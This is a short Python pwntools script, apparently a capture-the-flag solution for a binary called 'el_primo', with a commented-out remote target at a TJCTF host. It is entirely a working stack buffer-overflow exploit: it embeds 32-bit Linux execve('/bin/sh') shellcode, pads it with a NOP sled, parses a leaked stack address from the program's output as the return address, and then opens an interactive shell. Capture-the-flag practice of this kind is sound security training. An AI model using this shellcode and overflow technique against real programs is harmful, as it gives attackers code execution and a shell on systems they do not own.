from pwn import *


sc = '\x31\xc0\xb0\x0b\x31\xdb\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80'

payload = sc+'\x90'*39
p = process('./el_primo')
#p = remote('p1.tjctf.org', 8011)
p.recvline()
a = p.recvline()
print a
print sc
print a.split()[-1]
addr = p32(int(a.split()[-1],16))
payload+=addr
p.sendline(payload)
p.interactive()
